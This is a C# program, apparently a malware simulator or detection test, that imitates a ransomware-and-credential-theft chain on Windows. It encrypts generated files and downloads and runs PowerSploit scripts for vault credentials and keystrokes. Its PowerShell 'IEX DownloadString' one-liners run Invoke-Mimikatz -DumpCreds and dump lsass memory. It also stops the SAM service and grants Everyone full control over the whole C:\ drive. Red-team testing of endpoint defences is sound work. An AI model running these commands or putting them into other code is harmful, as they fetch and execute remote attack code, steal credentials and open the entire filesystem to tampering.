using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;

class Program3
{
    static void Main()
    {
        PrintHeader("Initialization");

        int numberOfFiles = 100;
        string path = @"C:\test";

        Directory.CreateDirectory(path);
        LogMessage("Directory created: " + path);

        string url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1";
        LogMessage("Set download URL: " + url);

        string powerShellCommand = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); Import-Module .\\OutMiniDump.ps1; Get-Process lsass | Out-Minidump";
        string powerShellCommand2 = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds";

        PrintHeader("Creating and Encrypting Files");
        for (int i = 1; i <= numberOfFiles; i++)
        {
            string fileName = $"File{i}.txt";
            string filePath = Path.Combine(path, fileName);
            string randomText = GenerateRandomText(100);

            byte[] encryptedBytes = EncryptText(randomText, "encryptionKey123");
            File.WriteAllBytes(filePath, encryptedBytes);

            LogMessage($"Generated and encrypted: {fileName}");
        }

        LoadSomeDlls();
        DoSomeFreakyStuff();

        PrintHeader("Downloading File");
        string downloadedFilePath = DownloadFile(url);

        PrintHeader("Executing File with Elevated Rights");
        ExecuteFileWithElevatedRights(downloadedFilePath);

        PrintHeader("Executing PowerShell Commands");
        ExecutePowerShellCommand(powerShellCommand2);
        ExecutePowerShellCommand(powerShellCommand);
    }

    static void PrintHeader(string moduleName)
    {
        const int headerLength = 40;
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        string header = $"[{timestamp}] [{moduleName.PadRight(headerLength - timestamp.Length - 4)}]";

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine(header);
        Console.ResetColor();
    }

    static void LogMessage(string message)
    {
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine($"[{timestamp}] {message}");
        Console.ResetColor();
    }

    static void DoSomeFreakyStuff()
    {
        // This command stops the Security Accounts Manager (SAM) service.
        // The SAM service stores local user account information. 
        // Stopping this service may prevent users from logging on, 
        // changing passwords, or performing other security-related operations.
        ExecuteCommand("net.exe", "stop samss /y", "net.exe stop 'samss' /y executed.");

        // This command modifies the access control lists (ACLs) to grant full control permissions 
        // to 'Everyone' for all files and directories on the C:\ drive.
        // This can expose sensitive data to unauthorized access or modification.
        // Furthermore, it can make the system vulnerable to a variety of attacks.
        ExecuteCommand("icacls.exe", "'C:\\*' /grant Everyone:F /T /C /Q", "icalcs.exe with granting executed!");
    }

    static void LoadSomeDlls()
    {
        // Import functions from various DLLs

        // CreateRemoteThread is used to execute a function in the address space of another process
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // SetWindowsHookEx is used to set a hook in the Windows message-handling mechanism
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, IntPtr lpfn, IntPtr hInstance, int threadId);

        // RegSetValueEx is used to set data in the Windows registry
        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        static extern int RegSetValueEx(IntPtr hKey, string lpValueName, int Reserved, RegistryValueKind dwType, byte[] lpData, int cbData);

        // URLDownloadToFile is used to download files from the internet
        [DllImport("urlmon.dll", CharSet = CharSet.Auto)]
        static extern int URLDownloadToFile(IntPtr pCaller, string szURL, string szFileName, int dwReserved, IntPtr lpfnCB);

        // InternetOpen initializes an application's use of the WinINet functions
        [DllImport("wininet.dll", CharSet = CharSet.Auto)]
        static extern IntPtr InternetOpen(string lpszAgent, int dwAccessType, string lpszProxyname, string lpszProxyBypass, int dwFlags);

        try
        {
            var processHandle = Process.GetCurrentProcess().Handle;

            // Calling various DLL functions as a demonstration
            IntPtr remoteThread = CreateRemoteThread(IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero);
            IntPtr hook = SetWindowsHookEx(2, IntPtr.Zero, IntPtr.Zero, 0);
            byte[] data = { 0x01, 0x02, 0x03 };
            int result = RegSetValueEx((IntPtr)0x80000002, "TestValue", 0, RegistryValueKind.Binary, data, data.Length);
            int downloadResult = URLDownloadToFile(IntPtr.Zero, "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1", "C:\\test\\Get-Keystrokes.ps1", 0, IntPtr.Zero);
            IntPtr internetHandle = InternetOpen("MyAgent", 1, null, null, 0);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error occurred: " + ex.Message);
        }
    }

    static string GenerateRandomText(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder(length);
        Random random = new Random();

        for (int i = 0; i < length; i++)
        {
            sb.Append(chars[random.Next(chars.Length)]);
        }

        return sb.ToString();
    }

    static byte[] EncryptText(string text, string key)
    {
        byte[] encryptedBytes;

        // Create an AES object to perform encryption
        using (Aes aes = Aes.Create())
        {
            // Set the encryption key (not safe in real-world usage due to static key)
            aes.Key = Encoding.UTF8.GetBytes(key);
            
            // Generate a random Initialization Vector (IV) for encryption
            aes.GenerateIV();

            // Create a memory stream to hold encrypted data
            using (MemoryStream memoryStream = new MemoryStream())
            {
                // Write the IV at the beginning of the stream
                memoryStream.Write(aes.IV, 0, aes.IV.Length);

                // Create a CryptoStream to perform encryption
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    byte[] textBytes = Encoding.UTF8.GetBytes(text);
                    cryptoStream.Write(textBytes, 0, textBytes.Length);
                    cryptoStream.FlushFinalBlock();

                    // Get the encrypted data from the memory stream
                    encryptedBytes = memoryStream.ToArray();
                }
            }
        }

        return encryptedBytes;
    }

    static string DownloadFile(string url)
    {
        string fileName = Path.GetFileName(url);
        string filePath = Path.Combine(Directory.GetCurrentDirectory(), fileName);

        using (WebClient client = new WebClient())
        {
            client.DownloadFile(url, filePath);
        }

        Console.WriteLine($"File downloaded: {fileName}");
        return filePath;
    }

    static void ExecuteFileWithElevatedRights(string filePath)
    {
        if (!IsElevated())
        {
            Console.WriteLine("This operation requires elevated rights. Please run the program as an administrator.");
            return;
        }

        // Execute the downloaded PowerShell file with elevated rights
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-ExecutionPolicy Bypass -File \"{filePath}\" | Import-Mobile .\\Get-VaultCredential.ps1 | Get-VaultCredential",
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process())
        {
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            Console.WriteLine("");
        }
    }

    static void ExecutePowerShellCommand(string command)
    {
        // Execute a given PowerShell command
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = $"-ExecutionPolicy Bypass -Command \"{command}\"",
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process())
        {
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
            Console.WriteLine("");
        }
    }

    static void ExecuteCommand(string fileName, string arguments, string successMessage)
    {
        try
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            process.StartInfo = startInfo;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            Console.WriteLine(output);
            Console.WriteLine(successMessage);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error occurred: " + ex.Message);
        }
    }

    static bool IsElevated()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }
}
